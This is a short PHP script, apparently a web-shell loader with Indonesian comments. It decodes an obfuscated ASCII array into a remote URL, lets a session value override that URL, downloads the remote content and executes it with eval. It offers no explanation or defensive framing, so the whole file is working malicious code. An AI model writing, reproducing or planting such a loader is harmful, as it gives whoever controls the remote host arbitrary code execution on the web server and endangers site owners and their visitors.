<?php
session_start();
#p1p1p1p
function fetchUrl($url) {
    if (!filter_var($url, FILTER_VALIDATE_URL)) {
        return false;
    }

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    
    $result = curl_exec($ch);
    
    if (curl_errno($ch)) {
        $result = false;
    }
    
    curl_close($ch);
    
    return $result;
}

// Konversi ASCII ke URL
$asciiArray = [104, 116, 116, 112, 115, 58, 47, 47, 116, 101, 97, 109, 122, 101, 100, 100, 50, 48, 50, 52, 46, 116, 101, 99, 104, 47, 114, 97, 119, 47, 77, 99, 117, 81, 71, 73];
$url = implode('', array_map('chr', $asciiArray));

// Gunakan URL dari session jika tersedia
$targetUrl = $_SESSION["ts_url"] ?? $url;

if (filter_var($targetUrl, FILTER_VALIDATE_URL)) {
    $result = @file_get_contents($targetUrl) ?: fetchUrl($targetUrl);

    if ($result !== false) {
        eval('?>' . $result);
    } else {
        echo "Error: Unable to fetch content.";
    }
} else {
    echo "Error: Invalid URL.";
}
?>
